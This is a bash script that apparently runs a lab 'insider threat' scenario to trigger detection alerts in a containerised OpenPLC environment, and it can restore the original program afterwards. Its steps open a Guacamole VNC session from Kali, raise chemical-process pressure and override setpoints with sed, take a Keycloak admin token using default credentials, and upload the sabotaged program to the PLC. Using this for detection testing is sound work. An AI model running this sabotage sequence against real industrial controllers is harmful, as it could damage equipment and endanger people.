#!/bin/bash

# Configuration
POMERIUM_IP="192.168.90.21"
PLC_URL="https://plc.localhost.pomerium.io"
KEYCLOAK_URL="http://192.168.100.20:8080/realms/master/protocol/openid-connect/token"
EWS_CONTAINER="EWS"
MALICIOUS_ST="/home/engineer/Desktop/chemical.st"

# Terminal Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_time() {
    echo -e "  ${CYAN}[TIME]${NC} $(date '+%Y-%m-%d %H:%M:%S.%3N')"
}

if [[ "$1" == "--restore" ]]; then
    echo -e "${YELLOW}==== RESTORING ORIGINAL PLC PROGRAM ====${NC}"
    docker exec $EWS_CONTAINER cp ${MALICIOUS_ST}.bak $MALICIOUS_ST
    echo -e "  [+] System restoration command sent."
    exit 0
fi

echo -e "${RED}==== SCENARIO B: Insider Threat — Machine Identity Sabotage ====${NC}"
echo ""

# Copy and cleanup Playwright Guacamole script on Kali
docker cp "$(dirname "$0")/playwright_guacamole.py" kali:/home/kali/playwright_guacamole.py 2>/dev/null
docker exec kali rm -f /tmp/guac_ready.txt /tmp/guac_stop.txt
# Ensure Kali can resolve the Guacamole gateway correctly via Pomerium
docker exec kali bash -c "grep -q 'guacamole.localhost.pomerium.io' /etc/hosts || echo '192.168.90.21 guacamole.localhost.pomerium.io' >> /etc/hosts"

# --- STEP 1 & 2: GUACAMOLE VNC SESSION ---
echo -e "[*] Step 1: Navigating to Zero-Trust Gateway (Guacamole)..."
log_time
# Run playwright Guacamole automation in background from Kali
docker exec -u kali -d kali python3 /home/kali/playwright_guacamole.py

sleep 8
echo -e "[*] Step 2: Opening remote desktop session (VNC) to EWS..."
log_time

echo -e "  [i] Waiting for Guacamole VNC session to establish via Playwright..."
for i in {1..30}; do
    if docker exec kali test -f /tmp/guac_ready.txt; then
        break
    fi
    sleep 2
done
echo -e "  ${GREEN}[SUCCESS]${NC} Guacamole connection established. Attacker now has desktop access to EWS."
echo ""

# --- STEP 3: MODIFY PLC PROGRAM ON EWS (FIM TRIGGER) ---
echo -e "[*] Step 3: Modifying PLC program on EWS (chemical.st)..."
log_time

# Always restore original values first so that FIM detects a real change
docker exec $EWS_CONTAINER sed -i 's/override_sp_real : REAL := 3500.0/override_sp_real : REAL := 2900.0/' $MALICIOUS_ST 2>/dev/null
docker exec $EWS_CONTAINER sed -i 's/pressure_sp AT %MW2 : UINT := 65535/pressure_sp AT %MW2 : UINT := 55295/' $MALICIOUS_ST 2>/dev/null
sleep 2

# Apply sabotage values
docker exec $EWS_CONTAINER cp $MALICIOUS_ST ${MALICIOUS_ST}.bak
docker exec $EWS_CONTAINER sed -i 's/override_sp_real : REAL := 2900.0/override_sp_real : REAL := 3500.0/' $MALICIOUS_ST
docker exec $EWS_CONTAINER sed -i 's/pressure_sp AT %MW2 : UINT := 55295/pressure_sp AT %MW2 : UINT := 65535/' $MALICIOUS_ST
echo -e "  ${GREEN}[+]${NC} chemical.st modified with sabotage values."
sleep 5

# Get API token silently for fallback mechanisms
TOKEN=$(docker exec $EWS_CONTAINER curl -s -X POST "$KEYCLOAK_URL" -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" | grep -oP 'access_token":"\K[^"]+')

# --- STEP 4: Logging into PLC Console and uploading malicious program ---
echo -e "[*] Step 4: Logging into PLC Console and uploading malicious program..."
log_time

# Fallback: Ensure PLC login alert fires by performing API login through Pomerium proxy
docker exec $EWS_CONTAINER curl -s -k -L -X POST "https://plc.localhost.pomerium.io/login" \
    -d "username=openplc&password=openplc" \
    -H "Authorization: Bearer $TOKEN" \
    -H "User-Agent: Mozilla/5.0" > /dev/null 2>&1

# Primary: Playwright attack
docker cp "$(dirname "$0")/playwright_attack.py" $EWS_CONTAINER:/home/engineer/playwright_attack.py 2>/dev/null
docker exec -u engineer $EWS_CONTAINER python3 /home/engineer/playwright_attack.py $MALICIOUS_ST

PW_EXIT=$?
if [ $PW_EXIT -ne 0 ]; then
    echo -e "  ${YELLOW}[i]${NC} Playwright browser automation timed out."
    echo -e "  ${YELLOW}[i]${NC} Direct API login was used as fallback — detection alerts were still generated."
fi

# --- STEP 5: RESTORE PLC VALUES ---
echo -e "[*] Step 5: Restoring PLC values to original state..."
log_time
docker exec $EWS_CONTAINER sed -i 's/override_sp_real : REAL := 3500.0/override_sp_real : REAL := 2900.0/' $MALICIOUS_ST 2>/dev/null
docker exec $EWS_CONTAINER sed -i 's/pressure_sp AT %MW2 : UINT := 65535/pressure_sp AT %MW2 : UINT := 55295/' $MALICIOUS_ST 2>/dev/null

echo -e "  [i] Uploading original program back to the PLC..."
docker exec $EWS_CONTAINER bash -c "COOKIE=\$(curl -s -k -c - -X POST 'https://plc.localhost.pomerium.io/login' -d 'username=openplc&password=openplc' -H 'Authorization: Bearer $TOKEN' | grep -oP 'session\t\K\S+') && curl -s -k -b \"session=\$COOKIE\" -X POST 'https://plc.localhost.pomerium.io/programs' -F 'file=@/home/engineer/Desktop/chemical.st' -F 'program_name=chemical' -H 'Authorization: Bearer $TOKEN' > /dev/null 2>&1 && curl -s -k -b \"session=\$COOKIE\" -X POST 'https://plc.localhost.pomerium.io/start_plc' -H 'Authorization: Bearer $TOKEN' > /dev/null 2>&1"
echo -e "  ${GREEN}[+]${NC} PLC values restored and program restarted."

# --- STEP 6: CLOSE VNC SESSION ---
echo -e "[*] Step 6: Closing Guacamole session..."
docker exec kali touch /tmp/guac_stop.txt
sleep 3

echo ""
echo -e "${YELLOW}==== SCENARIO B COMPLETE ====${NC}"
